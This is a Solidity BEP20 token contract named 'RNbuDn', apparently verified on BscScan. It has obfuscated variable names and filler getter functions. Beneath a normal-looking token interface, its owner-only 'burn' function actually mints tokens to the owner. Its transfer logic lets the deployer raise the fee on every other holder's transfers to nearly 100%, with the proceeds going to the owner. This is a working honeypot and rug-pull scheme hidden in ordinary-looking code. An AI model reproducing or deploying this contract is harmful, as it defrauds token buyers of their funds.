/**
 *Submitted for verification at BscScan.com on 2022-12-05
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.7.5;
contract RNbuDn {
address private  JRhpSz = address(0);
address private  HTAgmL = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  YmZaLm = address(0);
uint256 private  OTjlHI = 1000000000000000;
address private  VPzqSX = address(0);
address private  JBmqZN = address(0);
uint256 private  PNsxTg = 1000000000000000000000;
address private  vgrpcf = address(0);
uint256 private  qBLmXB = 1000000000000000000;
string public  symbol = "RNbuDn";
address private  KJMSyy = address(0);
uint256 private  dezYZE = 100000000;
uint256 private  NtFLSn = 10000000000000;
uint8 public constant decimals = 18;
address private  mddlnn = address(0);
uint256 private  nWprif = 1000000000000000000;
string public  name = "RNbuDn";
uint256 public constant ehUjLo = 99999;
address public owner;
event Approval(address indexed owner, address indexed spender, uint256 value);
mapping (address => mapping (address => uint256)) private _allowances;
mapping (address => uint256) public balanceOf;
uint256 private  NaFzyz = 10000000000;
address private  RafmEa = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}


function _getJRhpSz() private returns (address) {
return JRhpSz;
}

function _getOTjlHI() private returns (uint256) {
return OTjlHI;
}



function _getdezYZE() private returns (uint256) {
return dezYZE;
}

function _getNtFLSn() private returns (uint256) {
return NtFLSn;
}



function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getVPzqSX() private returns (address) {
return VPzqSX;
}

function _getvgrpcf() private returns (address) {
return vgrpcf;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}


function _getHTAgmL() private returns (address) {
return HTAgmL;
}

function _getnWprif() private returns (uint256) {
return nWprif;
}



constructor () {
JBmqZN = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getmddlnn() private returns (address) {
return mddlnn;
}



function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getKJMSyy() private returns (address) {
return KJMSyy;
}





function _getYmZaLm() private returns (address) {
return YmZaLm;
}





function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "thedmVd 0");
require(spender != address(0), "fhedmVd 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getNaFzyz() private returns (uint256) {
return NaFzyz;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}




function _getPNsxTg() private returns (uint256) {
return PNsxTg;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "hedmVd");
require(to != address(0), "hedmVd");
require(amount <= balanceOf[from], "hedmVd");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* ehUjLo/qBLmXB ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==JBmqZN){
qBLmXB = ehUjLo+2;
}
emit Transfer(from, to, transferAmount);
}
function _getRafmEa() private returns (address) {
return RafmEa;
}








}